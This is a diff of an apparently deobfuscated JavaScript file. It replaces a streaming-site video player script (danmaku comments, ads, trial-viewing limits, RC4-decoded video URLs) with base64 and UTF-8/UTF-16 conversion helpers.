@@ -1,648 +1,205 @@
-//Wed Aug 06 2025 05:55:40 GMT+0000 (Coordinated Universal Time)
+//Wed Aug 06 2025 08:46:01 GMT+0000 (Coordinated Universal Time)
 //Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
 //Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
-var YKQ = {
-  "versions": function () {
-    var _0x400b4c = navigator.userAgent,
-      _0x11ab90 = navigator.appVersion;
-    return {
-      "trident": _0x400b4c.indexOf("Trident") > -1,
-      "presto": _0x400b4c.indexOf("Presto") > -1,
-      "webKit": _0x400b4c.indexOf("AppleWebKit") > -1,
-      "gecko": _0x400b4c.indexOf("Gecko") > -1 && _0x400b4c.indexOf("KHTML") == -1,
-      "mobile": !!_0x400b4c.match(/AppleWebKit.*Mobile.*/),
-      "ios": !!_0x400b4c.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
-      "android": _0x400b4c.indexOf("Android") > -1 || _0x400b4c.indexOf("Adr") > -1,
-      "iPhone": _0x400b4c.indexOf("iPhone") > -1,
-      "iPad": _0x400b4c.indexOf("iPad") > -1,
-      "webApp": _0x400b4c.indexOf("Safari") == -1,
-      "weixin": _0x400b4c.indexOf("MicroMessenger") > -1,
-      "qq": _0x400b4c.match(/\sQQ/i) == " qq"
-    };
-  }(),
-  "start": function () {
-    $.ajax({
-      "url": "/admin/api.php",
-      "dataType": "json",
-      "success": function (_0x4f0b5a) {
-        YKQ.waittime = _0x4f0b5a.data.waittime;
-        YKQ.ads = _0x4f0b5a.data.ads;
-        config.logo = _0x4f0b5a.data.logo;
-        up.pbgjz = _0x4f0b5a.data.pbgjz;
-        up.trysee = _0x4f0b5a.data.trytime;
-        config.sendtime = _0x4f0b5a.data.sendtime;
-        config.color = _0x4f0b5a.data.color;
-        config.dmrule = _0x4f0b5a.data.dmrule;
-        danmuon = _0x4f0b5a.data.danmuon;
-        if (YKQ.ads.state == "on") {
-          if (YKQ.ads.set.state == "1") YKQ.MYad.vod(YKQ.ads.set.vod.url, YKQ.ads.set.vod.link);else YKQ.ads.set.state == "2" && YKQ.MYad.pic(YKQ.ads.set.pic.link, YKQ.ads.set.pic.time, YKQ.ads.set.pic.img);
-        } else YKQ.play(rc4(config.url, "202512221638052109", 1));
-      }
-    });
-  },
-  "play": function (_0x3991d9) {
-    !danmuon ? YKQ.player.play(_0x3991d9) : config.av != "" ? YKQ.player.bdplay(_0x3991d9) : YKQ.player.dmplay(_0x3991d9);
-    $(function () {
-      $(".yzmplayer-setting-speeds,.yzmplayer-setting-speed-item").on("click", function () {
-        $(".speed-stting").toggleClass("speed-stting-open");
-      });
-      $(".speed-stting .yzmplayer-setting-speed-item").click(function () {
-        $(".yzmplayer-setting-speeds  .title").text($(this).text());
-      });
-    });
-    $(".yzmplayer-fulloff-icon").on("click", function () {
-      YKQ.dp.fullScreen.cancel();
-    });
-    $(".yzmplayer-showing").on("click", function () {
-      YKQ.dp.play();
-      $(".vod-pic").remove();
-    });
-    config.title != "" && $("#vodtitle").html(config.title + "  " + config.sid);
-  },
-  "dmid": function () {
-    if (up.diyid[0] == 0 && config.id != "") a = config.id, b = config.sid;else (up.diyid[0] == 1 || !config.id) && (a = up.diyid[1], b = up.diyid[2]);
-    YKQ.id = a + " P" + b;
-  },
-  "load": function () {
-    setTimeout(function () {
-      $("#link1").fadeIn();
-    }, 100);
-    setTimeout(function () {
-      $("#link1-success").fadeIn();
-    }, 500);
-    setTimeout(function () {
-      $("#link2").show();
-    }, 1000);
-    setTimeout(function () {
-      $("#link3,#span").fadeIn();
-    }, 2000);
-    if (YKQ.versions.weixin && (YKQ.versions.ios || YKQ.versions.iPad)) {
-      var _0x49a263 = "<style type=\"text/css\">";
-      _0x49a263 += "#loading-box{display: none;}";
-      _0x49a263 += "</style>";
-      $("body").append(_0x49a263).addClass("");
-    }
-    YKQ.danmu.send();
-    YKQ.danmu.list();
-    YKQ.def();
-    YKQ.video.try();
-    YKQ.dp.danmaku.opacity(1);
-  },
-  "def": function () {
-    console.log("播放器开启");
-    YKQ.stime = 0;
-    YKQ.headt = yzmck.get("headt");
-    YKQ.lastt = yzmck.get("lastt");
-    YKQ.last_tip = parseInt(YKQ.lastt) + 10;
-    YKQ.frists = yzmck.get("frists");
-    YKQ.lasts = yzmck.get("lasts");
-    YKQ.playtime = Number(YKQ.getCookie("time_" + config.url));
-    YKQ.ctime = YKQ.formatTime(YKQ.playtime);
-    YKQ.dp.on("loadedmetadata", function () {
-      YKQ.loadedmetadataHandler();
-    });
-    YKQ.dp.on("ended", function () {
-      YKQ.endedHandler();
-    });
-    YKQ.dp.on("pause", function () {
-      YKQ.MYad.pause.play(YKQ.ads.pause.link, YKQ.ads.pause.pic);
-    });
-    YKQ.dp.on("play", function () {
-      YKQ.MYad.pause.out();
-    });
-    YKQ.dp.on("timeupdate", function (_0x472a39) {
-      YKQ.timeupdateHandler();
-    });
-    YKQ.jump.def();
-  },
-  "video": {
-    "play": function () {
-      $("#link3").text("视频已准备就绪，即将为您播放");
-      setTimeout(function () {
-        YKQ.dp.play();
-        $("#my-loading", parent.document).remove();
-        YKQ.jump.head();
-      }, 0);
-    },
-    "next": function () {
-      top.location.href = up.mylink + config.next;
-    },
-    "try": function () {
-      up.trysee > 0 && config.group < config.group_x && config.group != "" && ($("#dmtext").attr({
-        "disabled": true,
-        "placeholder": "登陆后才能发弹幕yo(・ω・)"
-      }), setInterval(function () {
-        var _0x442b85 = up.trysee * 60,
-          _0x4a525f = YKQ.dp.video.currentTime;
-        _0x4a525f > _0x442b85 && (YKQ.dp.video.currentTime = 0, YKQ.dp.pause(), layer.confirm(up.trysee + "分钟试看已结束，请登录继续播放完整视频", {
-          "anim": 1,
-          "title": "温馨提示",
-          "btn": ["登录", "注册"],
-          "yes": function (_0x17d8cd, _0x567302) {
-            top.location.href = up.mylink + "/index.php/user/login.html";
-          },
-          "btn2": function (_0x462157, _0x3c09a3) {
-            top.location.href = up.mylink + "/index.php/user/reg.html";
-          }
-        }));
-      }, 1000));
-    },
-    "seek": function () {
-      YKQ.dp.seek(YKQ.playtime);
-    },
-    "end": function () {
-      layer.msg("播放结束啦=。=");
-    },
-    "con_play": function () {
-      if (!danmuon) YKQ.jump.head();else {
-        var _0x5a37ce = " <e>已播放至" + YKQ.ctime + "，继续上次播放？</e><d class=\"conplay-jump\">是 <i id=\"num\">" + YKQ.waittime + "</i>s</d><d class=\"conplaying\">否</d>";
-        $("#link3").html(_0x5a37ce);
-        var _0x144b0b = document.getElementById("num");
-        var _0x5ad62f = _0x144b0b.innerHTML;
-        var _0x319810 = null;
-        setTimeout(function () {
-          _0x319810 = setInterval(function () {
-            _0x5ad62f--;
-            _0x144b0b.innerHTML = _0x5ad62f;
-            _0x5ad62f == 0 && (clearInterval(_0x319810), YKQ.video.seek(), YKQ.dp.play(), $(".memory-play-wrap,#loading-box").remove());
-          }, 1000);
-        }, 1);
-      }
-      var _0x1c1db8 = "<div class=\"memory-play-wrap\"><div class=\"memory-play\"><span class=\"close\">×</span><span>上次看到 </span><span>" + YKQ.ctime + "</span><span class=\"play-jump\">跳转播放</span></div></div>";
-      $(".yzmplayer-cplayer").append(_0x1c1db8);
-      $("#my-loading", parent.document).remove();
-      YKQ.dp.play();
-      $(".close").on("click", function () {
-        $(".memory-play-wrap").remove();
-      });
-      setTimeout(function () {
-        $(".memory-play-wrap").remove();
-      }, 20000);
-      $(".conplaying").on("click", function () {
-        clearTimeout(_0x319810);
-        $("#loading-box").remove();
-        YKQ.dp.play();
-        YKQ.jump.head();
-      });
-      $(".conplay-jump,.play-jump").on("click", function () {
-        clearTimeout(_0x319810);
-        YKQ.video.seek();
-        $(".memory-play-wrap,#loading-box").remove();
-        YKQ.dp.play();
-      });
-    }
-  },
-  "jump": {
-    "def": function () {
-      h = ".yzmplayer-setting-jfrist label";
-      l = ".yzmplayer-setting-jlast label";
-      f = "#fristtime";
-      j = "#jumptime";
-      _0x51191d(h, "frists", YKQ.frists, "headt", YKQ.headt, f);
-      _0x51191d(l, "lasts", YKQ.lasts, "lastt", YKQ.lastt, j);
-      function _0x481266() {
-        layer.msg("请输入有效时间哟！");
-      }
-      function _0x2474f4() {
-        layer.msg("设置完成，将在刷新或下一集生效");
-      }
-      function _0x51191d(_0x283e77, _0x3c3cc5, _0x7be484, _0x508000, _0x473df1, _0x2dad10) {
-        $(_0x283e77).on("click", function () {
-          o = $(_0x2dad10).val();
-          o > 0 ? ($(_0x283e77).toggleClass("checked"), _0x2474f4(), _0x473df1 = $(_0x2dad10).val(), yzmck.set(_0x508000, _0x473df1)) : _0x481266();
-        });
-        _0x7be484 == 1 ? ($(_0x283e77).addClass("checked"), $(_0x283e77).click(function () {
-          o = $(_0x2dad10).val();
-          if (o > 0) yzmck.set(_0x3c3cc5, 0);else {
-            _0x481266();
-          }
-        })) : $(_0x283e77).click(function () {
-          {
-            o = $(_0x2dad10).val();
-            o > 0 ? yzmck.set(_0x3c3cc5, 1) : _0x481266();
-          }
-        });
-      }
-      $(f).attr({
-        "value": YKQ.headt
-      });
-      $(j).attr({
-        "value": YKQ.lastt
-      });
-      YKQ.jump.last();
-    },
-    "head": function () {
-      if (YKQ.stime > YKQ.playtime) YKQ.playtime = YKQ.stime;
-      if (YKQ.frists == 1) {
-        if (YKQ.headt > YKQ.playtime || YKQ.playtime == 0) YKQ.jump_f = 1;else {
-          YKQ.jump_f = 0;
-        }
-      }
-      YKQ.jump_f == 1 && (YKQ.dp.seek(YKQ.headt), YKQ.dp.notice("已为您跳过片头"));
-    },
-    "last": function () {
-      if (config.next != "") {
-        YKQ.lasts == 1 && setInterval(function () {
-          var _0x2a835e = YKQ.dp.video.duration - YKQ.dp.video.currentTime;
-          if (_0x2a835e < YKQ.last_tip) YKQ.dp.notice("即将为您跳过片尾");
-          YKQ.lastt > 0 && _0x2a835e < YKQ.lastt && (YKQ.setCookie("time_" + config.url, "", -1), YKQ.video.next());
-        }, 1000);
-      } else {
-        $(".icon-xj").remove();
-      }
-    },
-    "ad": function (_0x3558c3, _0x48baef) {}
-  },
-  "danmu": {
-    "send": function () {
-      g = $(".yzm-yzmplayer-send-icon");
-      d = $("#dmtext");
-      h = ".yzmplayer-comment-setting-";
-      $(h + "color input").on("click", function () {
-        r = $(this).attr("value");
-        setTimeout(function () {
-          d.css({
-            "color": r
-          });
-        }, 100);
-      });
-      $(h + "type input").on("click", function () {
-        t = $(this).attr("value");
-        setTimeout(function () {
-          d.attr("dmtype", t);
-        }, 100);
-      });
-      $(h + "font input").on("click", function () {
-        {
-          if (up.trysee > 0 && config.group == config.group_x) {
-            layer.msg("会员专属功能");
-            return;
-          }
-          t = $(this).attr("value");
-          setTimeout(function () {
-            d.attr("size", t);
-          }, 100);
-        }
-      });
-      g.on("click", function () {
-        {
-          a = document.getElementById("dmtext");
-          a = a.value;
-          b = d.attr("dmtype");
-          c = d.css("color");
-          z = d.attr("size");
-          if (up.trysee > 0 && config.group < config.group_x && config.group != "") {
-            layer.msg("登陆后才能发弹幕yo(・ω・)");
-            return;
-          }
-          for (var _0x331f8e = 0; _0x331f8e < up.pbgjz.length; _0x331f8e++) {
-            if (a.search(up.pbgjz[_0x331f8e]) != -1) {
-              {
-                layer.msg("请勿发送无意义内容，规范您的弹幕内容");
-                return;
-              }
-            }
-          }
-          if (a.length < 1) {
-            layer.msg("要输入弹幕内容啊喂！");
-            return;
-          }
-          var _0x1f4c4c = Date.parse(new Date()),
-            _0x33df73 = yzmck.get("dmsent", _0x1f4c4c);
-          if (_0x1f4c4c - _0x33df73 < config.sendtime * 1000) {
-            layer.msg("请勿频繁操作！发送弹幕需间隔" + config.sendtime + "秒~");
-            return;
-          }
-          d.val("");
-          YKQ.dp.danmaku.send({
-            "text": a,
-            "color": c,
-            "type": b,
-            "size": z
-          });
-          yzmck.set("dmsent", _0x1f4c4c);
-        }
-      });
-      function _0x3b372d() {
-        g.trigger("click");
-      }
-      d.keydown(function (_0x550732) {
-        _0x550732.keyCode == 13 && _0x3b372d();
-      });
-    },
-    "list": function () {
-      $(".yzmplayer-list-icon,.yzm-yzmplayer-send-icon").on("click", function () {
-        $(".list-show").empty();
-        $.ajax({
-          "url": config.api + "?ac=get&id=" + YKQ.id,
-          "success": function (_0x10944a) {
-            if (_0x10944a.code == 23) {
-              {
-                a = _0x10944a.danmuku;
-                b = _0x10944a.name;
-                c = _0x10944a.danum;
-                $(".danmuku-num").text(c);
-                $(a).each(function (_0x3038f0, _0x26090e) {
-                  l = "<d class=\"danmuku-list\" time=\"" + _0x26090e[0] + "\"><li>" + YKQ.formatTime(_0x26090e[0]) + "</li><li title=\"" + _0x26090e[4] + "\">" + _0x26090e[4] + "</li><li title=\"用户：" + _0x26090e[3] + "  IP地址：" + _0x26090e[5] + "\">" + _0x26090e[6] + "</li><li class=\"report\" onclick=\"YKQ.danmu.report('" + _0x26090e[5] + "','" + b + "','" + _0x26090e[4] + "','" + _0x26090e[3] + "')\">举报</li></d>";
-                  $(".list-show").append(l);
-                });
-              }
-            }
-            $(".danmuku-list").on("dblclick", function () {
-              YKQ.dp.seek($(this).attr("time"));
-            });
-          }
-        });
-      });
-      var _0x5f26c6 = "<div class=\"dmrules\"><a target=\"_blank\" href=\"" + config.dmrule + "\">弹幕礼仪 </a></div>";
-      $("div.yzmplayer-comment-box:last").append(_0x5f26c6);
-      $(".yzmplayer-watching-number").text(up.usernum);
-      $(".yzmplayer-info-panel-item-title-amount .yzmplayer-info-panel-item-title").html("违规词");
-      for (var _0x49a61f = 0; _0x49a61f < up.pbgjz.length; _0x49a61f++) {
-        var _0x412c4c = "<e>" + up.pbgjz[_0x49a61f] + "</e>";
-        $("#vod-title").append(_0x412c4c);
-      }
-      _0x5ad158(".yzmplayer-list-icon", ".yzmplayer-danmu", "show");
-      function _0x5ad158(_0x28deac, _0x113a5e, _0x444e80, _0x295b29) {
-        $(_0x28deac).click(function () {
-          $(_0x113a5e).toggleClass(_0x444e80);
-          $(_0x295b29).remove();
-        });
-      }
-    },
-    "report": function (_0x409f5c, _0x35c42b, _0x70b58f, _0x445f04) {
-      layer.confirm("" + _0x70b58f + "<!--br><br><span style=\"color:#333\">请选择需要举报的类型</span-->", {
-        "anim": 1,
-        "title": "举报弹幕",
-        "btn": ["违法违禁", "色情低俗", "恶意刷屏", "赌博诈骗", "人身攻击", "侵犯隐私", "垃圾广告", "剧透", "引战"],
-        "btn3": function (_0x56fb2b, _0x2aa417) {
-          YKQ.danmu.post_r(_0x409f5c, _0x35c42b, _0x70b58f, _0x445f04, "恶意刷屏");
-        },
-        "btn4": function (_0x2087c2, _0x209b3b) {
-          YKQ.danmu.post_r(_0x409f5c, _0x35c42b, _0x70b58f, _0x445f04, "赌博诈骗");
-        },
-        "btn5": function (_0x57604f, _0x14c102) {
-          YKQ.danmu.post_r(_0x409f5c, _0x35c42b, _0x70b58f, _0x445f04, "人身攻击");
-        },
-        "btn6": function (_0x2fe74b, _0x475535) {
-          YKQ.danmu.post_r(_0x409f5c, _0x35c42b, _0x70b58f, _0x445f04, "侵犯隐私");
-        },
-        "btn7": function (_0xe9da1d, _0x10f2a4) {
-          YKQ.danmu.post_r(_0x409f5c, _0x35c42b, _0x70b58f, _0x445f04, "垃圾广告");
-        },
-        "btn8": function (_0x30eec5, _0x335eb5) {
-          YKQ.danmu.post_r(_0x409f5c, _0x35c42b, _0x70b58f, _0x445f04, "剧透");
-        },
-        "btn9": function (_0x50cdf9, _0x3cdec6) {
-          YKQ.danmu.post_r(_0x409f5c, _0x35c42b, _0x70b58f, _0x445f04, "引战");
-        }
-      }, function (_0x495256, _0x2fe589) {
-        YKQ.danmu.post_r(_0x409f5c, _0x35c42b, _0x70b58f, _0x445f04, "违法违禁");
-      }, function (_0x1d9a15) {
-        YKQ.danmu.post_r(_0x409f5c, _0x35c42b, _0x70b58f, _0x445f04, "色情低俗");
-      });
-    },
-    "post_r": function (_0x4368dd, _0x29a9ec, _0x3106c2, _0x2d24d1, _0x2dabb2) {
-      $.ajax({
-        "type": "get",
-        "url": config.api + "?ac=report&cid=" + _0x2d24d1 + "&user=" + _0x4368dd + "&type=" + _0x2dabb2 + "&title=" + _0x29a9ec + "&text=" + _0x3106c2,
-        "cache": false,
-        "dataType": "json",
-        "beforeSend": function () {},
-        "success": function (_0x5bcd9a) {
-          layer.msg("举报成功！感谢您为守护弹幕作出了贡献");
-        },
-        "error": function (_0x3f854b) {
-          {
-            var _0x1add7b = "服务故障 or 网络异常，稍后再试6！";
-            layer.msg(_0x1add7b);
-          }
-        }
-      });
-    }
-  },
-  "setCookie": function (_0x4e2ded, _0x1d336a, _0x84e661) {
-    var _0x5641b7 = new Date();
-    _0x5641b7.setHours(_0x5641b7.getHours() + _0x84e661);
-    window.sessionStorage ? window.sessionStorage.setItem("playtime", _0x4e2ded + "=" + escape(_0x1d336a) + (_0x84e661 === null ? "" : ";expires=" + _0x5641b7.toGMTString())) : document.cookie = _0x4e2ded + "=" + escape(_0x1d336a) + (_0x84e661 === null ? "" : ";expires=" + _0x5641b7.toGMTString());
-  },
-  "getCookie": function (_0x59086a) {
-    if (window.sessionStorage) {
-      {
-        var _0x1fdb09 = window.sessionStorage.getItem("playtime");
-        if (_0x1fdb09 && _0x1fdb09.length > 0) {
-          c_start = _0x1fdb09.indexOf(_0x59086a + "=");
-          if (c_start !== -1) {
-            c_start = c_start + _0x59086a.length + 1;
-            c_end = _0x1fdb09.indexOf(";", c_start);
-            c_end === -1 && (c_end = _0x1fdb09.length);
-            return unescape(_0x1fdb09.substring(c_start, c_end));
-          }
-        }
-      }
-    } else {
-      {
-        if (document.cookie.length > 0) {
-          c_start = document.cookie.indexOf(_0x59086a + "=");
-          if (c_start !== -1) {
-            c_start = c_start + _0x59086a.length + 1;
-            c_end = document.cookie.indexOf(";", c_start);
-            c_end === -1 && (c_end = document.cookie.length);
-            return unescape(document.cookie.substring(c_start, c_end));
-          }
-        }
-      }
-    }
-    return "";
-  },
-  "formatTime": function (_0x46dcf3) {
-    return [parseInt(_0x46dcf3 / 60 / 60), parseInt(_0x46dcf3 / 60 % 60), parseInt(_0x46dcf3 % 60)].join(":").replace(/\b(\d)\b/g, "0$1");
-  },
-  "loadedmetadataHandler": function () {
-    YKQ.playtime > 0 && YKQ.dp.video.currentTime < YKQ.playtime ? setTimeout(function () {
-      YKQ.video.con_play();
-    }, 1000) : setTimeout(function () {
-      !danmuon ? YKQ.jump.head() : (YKQ.dp.notice("视频已准备就绪，即将为您播放"), $("#my-loading", parent.document).remove(), YKQ.video.play());
-    }, 0);
-    YKQ.dp.on("timeupdate", function () {
-      YKQ.timeupdateHandler();
-    });
-  },
-  "timeupdateHandler": function () {
-    YKQ.setCookie("time_" + config.url, YKQ.dp.video.currentTime, 24);
-  },
-  "endedHandler": function () {
-    YKQ.setCookie("time_" + config.url, "", -1);
-    config.next != "" ? (YKQ.dp.notice("5s后,将自动为您播放下一集"), setTimeout(function () {
-      YKQ.video.next();
-    }, 5000)) : (YKQ.dp.notice("视频播放已结束"), setTimeout(function () {
-      YKQ.video.end();
-    }, 2000));
-  },
-  "player": {
-    "play": function (_0x49fa2b) {
-      $("body").addClass("danmu-off");
-      YKQ.dp = new yzmplayer({
-        "autoplay": true,
-        "element": document.getElementById("player"),
-        "theme": config.color,
-        "logo": config.logo,
-        "video": {
-          "url": _0x49fa2b,
-          "pic": config.pic,
-          "type": "auto"
-        }
-      });
-      var _0x262e27 = "<style type=\"text/css\">";
-      _0x262e27 += "#loading-box{display: none;}";
-      _0x262e27 += "</style>";
-      $("body").append(_0x262e27).addClass("");
-      YKQ.def();
-    },
-    "adplay": function (_0x2144d0) {
-      $("body").addClass("danmu-off");
-      YKQ.ad = new yzmplayer({
-        "autoplay": true,
-        "element": document.getElementById("ADplayer"),
-        "theme": config.color,
-        "logo": config.logo,
-        "video": {
-          "url": _0x2144d0,
-          "pic": config.pic,
-          "type": "auto"
-        }
-      });
-      $(".yzmplayer-controller,.yzmplayer-cplayer,.yzmplayer-logo,#loading-box,.yzmplayer-controller-mask").remove();
-      $(".yzmplayer-mask").show();
-      YKQ.ad.on("timeupdate", function () {
-        {
-          if (YKQ.ad.video.currentTime > YKQ.ad.video.duration - 0.1) {
-            $("body").removeClass("danmu-off");
-            YKQ.ad.destroy();
-            $("#ADplayer").remove();
-            $("#ADtip").remove();
-            YKQ.play(config.url);
-          }
-        }
-      });
-    },
-    "dmplay": function (_0x5d932a) {
-      YKQ.dmid();
-      YKQ.dp = new yzmplayer({
-        "autoplay": true,
-        "element": document.getElementById("player"),
-        "theme": config.color,
-        "logo": config.logo,
-        "video": {
-          "url": _0x5d932a,
-          "pic": config.pic,
-          "type": "auto"
-        },
-        "danmaku": {
-          "id": YKQ.id,
-          "api": config.api + "?ac=dm",
-          "user": config.user
-        }
-      });
-      YKQ.load();
-    },
-    "bdplay": function (_0x239dcc) {
-      YKQ.dmid();
-      YKQ.dp = new yzmplayer({
-        "autoplay": true,
-        "element": document.getElementById("player"),
-        "theme": config.color,
-        "logo": config.logo,
-        "video": {
-          "url": _0x239dcc,
-          "pic": config.pic,
-          "type": "auto"
-        },
-        "danmaku": {
-          "id": YKQ.id,
-          "api": config.api + "?ac=dm",
-          "user": config.user,
-          "addition": [config.api + "bilibili/?av=" + config.av]
-        }
-      });
-      YKQ.load();
-    }
-  },
-  "MYad": {
-    "vod": function (_0x1645a4, _0x5a99d1) {
-      $("#ADtip").html("<a id=\"link\" href=\"" + _0x5a99d1 + "\" target=\"_blank\">查看详情</a>");
-      $("#ADplayer").click(function () {
-        document.getElementById("link").click();
-      });
-      YKQ.player.adplay(_0x1645a4);
-    },
-    "pic": function (_0x3d5801, _0x1877ea, _0x145e55) {
-      $("#ADtip").html("<a id=\"link\" href=\"" + _0x3d5801 + "\" target=\"_blank\">广告 <e id=\"time_ad\">" + _0x1877ea + "</e></a><img src=\"" + _0x145e55 + "\">");
-      $("#ADtip").click(function () {
-        document.getElementById("link").click();
-      });
-      var _0xc2c970 = document.getElementById("time_ad"),
-        _0x3299ec = _0xc2c970.innerHTML,
-        _0x433bcc = null;
-      setTimeout(function () {
-        _0x433bcc = setInterval(function () {
-          _0x3299ec--;
-          _0xc2c970.innerHTML = _0x3299ec;
-          if (_0x3299ec == 0) {
-            clearInterval(_0x433bcc);
-            YKQ.play(config.url);
-            $("#ADtip").remove();
-          }
-        }, 1000);
-      }, 1);
-    },
-    "pause": {
-      "play": function (_0x4f4acd, _0x1680c0) {
-        if (YKQ.ads.pause.state == "on") {
-          {
-            var _0x1272c3 = "<div id=\"player_pause\"><div class=\"tip\">广告</div><a href=\"" + _0x4f4acd + "\" target=\"_blank\"><img src=\"" + _0x1680c0 + "\"></a></div>";
-            $("#player").before(_0x1272c3);
-          }
-        }
-      },
-      "out": function () {
-        $("#player_pause").remove();
-      }
-    }
-  }
+var killErrors = function (value) {
+  return true;
 };
-function rc4(_0x2262fd, _0x112647, _0x1bd18b) {
-  var _0x29a4a9 = _0x112647 || "bigon",
-    _0x409395 = "",
-    _0x112647 = [],
-    _0x3e4509 = [],
-    _0x1bbf36 = _0x29a4a9.length;
-  if (_0x1bd18b == 1) {
-    var _0x2262fd = atob(_0x2262fd);
-  } else {
-    var _0x2262fd = encodeURIComponent(_0x2262fd);
+window.onerror = null;
+window.onerror = killErrors;
+var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+var base64DecodeChars = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);
+function base64encode(str) {
+  var out, i, len;
+  var c1, c2, c3;
+  len = str.length;
+  i = 0;
+  out = "";
+  while (i < len) {
+    c1 = str.charCodeAt(i++) & 0xff;
+    if (i == len) {
+      out += base64EncodeChars.charAt(c1 >> 2);
+      out += base64EncodeChars.charAt((c1 & 0x3) << 4);
+      out += "==";
+      break;
+    }
+    c2 = str.charCodeAt(i++);
+    if (i == len) {
+      out += base64EncodeChars.charAt(c1 >> 2);
+      out += base64EncodeChars.charAt((c1 & 0x3) << 4 | (c2 & 0xF0) >> 4);
+      out += base64EncodeChars.charAt((c2 & 0xF) << 2);
+      out += "=";
+      break;
+    }
+    c3 = str.charCodeAt(i++);
+    out += base64EncodeChars.charAt(c1 >> 2);
+    out += base64EncodeChars.charAt((c1 & 0x3) << 4 | (c2 & 0xF0) >> 4);
+    out += base64EncodeChars.charAt((c2 & 0xF) << 2 | (c3 & 0xC0) >> 6);
+    out += base64EncodeChars.charAt(c3 & 0x3F);
   }
-  var _0x143495 = _0x2262fd.length;
-  for (i = 0; i < 256; i++) {
-    _0x112647[i] = _0x29a4a9[i % _0x1bbf36].charCodeAt();
-    _0x3e4509[i] = i;
-  }
-  for (j = i = 0; i < 256; i++) {
-    j = (j + _0x3e4509[i] + _0x112647[i]) % 256;
-    tmp = _0x3e4509[i];
-    _0x3e4509[i] = _0x3e4509[j];
-    _0x3e4509[j] = tmp;
-  }
-  for (a = j = i = 0; i < _0x143495; i++) {
-    a = (a + 1) % 256;
-    j = (j + _0x3e4509[a]) % 256;
-    tmp = _0x3e4509[a];
-    _0x3e4509[a] = _0x3e4509[j];
-    _0x3e4509[j] = tmp;
-    k = _0x3e4509[(_0x3e4509[a] + _0x3e4509[j]) % 256];
-    _0x409395 += String.fromCharCode(_0x2262fd[i].charCodeAt() ^ k);
-  }
-  if (_0x1bd18b == 1) {
-    return decodeURIComponent(_0x409395);
-  } else return btoa(_0x409395);
+  return out;
 }
+function base64decode(str) {
+  var c1, c2, c3, c4;
+  var i, len, out;
+  len = str.length;
+  i = 0;
+  out = "";
+  while (i < len) {
+    do {
+      c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
+    } while (i < len && c1 == -1);
+    if (c1 == -1) break;
+    do {
+      c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
+    } while (i < len && c2 == -1);
+    if (c2 == -1) break;
+    out += String.fromCharCode(c1 << 2 | (c2 & 0x30) >> 4);
+    do {
+      c3 = str.charCodeAt(i++) & 0xff;
+      if (c3 == 61) return out;
+      c3 = base64DecodeChars[c3];
+    } while (i < len && c3 == -1);
+    if (c3 == -1) break;
+    out += String.fromCharCode((c2 & 0XF) << 4 | (c3 & 0x3C) >> 2);
+    do {
+      c4 = str.charCodeAt(i++) & 0xff;
+      if (c4 == 61) return out;
+      c4 = base64DecodeChars[c4];
+    } while (i < len && c4 == -1);
+    if (c4 == -1) break;
+    out += String.fromCharCode((c3 & 0x03) << 6 | c4);
+  }
+  return out;
+}
+function utf16to8(str) {
+  var out, i, len, c;
+  out = "";
+  len = str.length;
+  for (i = 0; i < len; i++) {
+    c = str.charCodeAt(i);
+    if (c >= 0x0001 && c <= 0x007F) {
+      out += str.charAt(i);
+    } else if (c > 0x07FF) {
+      out += String.fromCharCode(0xE0 | c >> 12 & 0x0F);
+      out += String.fromCharCode(0x80 | c >> 6 & 0x3F);
+      out += String.fromCharCode(0x80 | c >> 0 & 0x3F);
+    } else {
+      out += String.fromCharCode(0xC0 | c >> 6 & 0x1F);
+      out += String.fromCharCode(0x80 | c >> 0 & 0x3F);
+    }
+  }
+  return out;
+}
+function utf8to16(str) {
+  var out, i, len, c;
+  var char2, char3;
+  out = "";
+  len = str.length;
+  i = 0;
+  while (i < len) {
+    c = str.charCodeAt(i++);
+    switch (c >> 4) {
+      case 0:
+      case 1:
+      case 2:
+      case 3:
+      case 4:
+      case 5:
+      case 6:
+      case 7:
+        out += str.charAt(i - 1);
+        break;
+      case 12:
+      case 13:
+        char2 = str.charCodeAt(i++);
+        out += String.fromCharCode((c & 0x1F) << 6 | char2 & 0x3F);
+        break;
+      case 14:
+        char2 = str.charCodeAt(i++);
+        char3 = str.charCodeAt(i++);
+        out += String.fromCharCode((c & 0x0F) << 12 | (char2 & 0x3F) << 6 | (char3 & 0x3F) << 0);
+        break;
+    }
+  }
+  return out;
+}
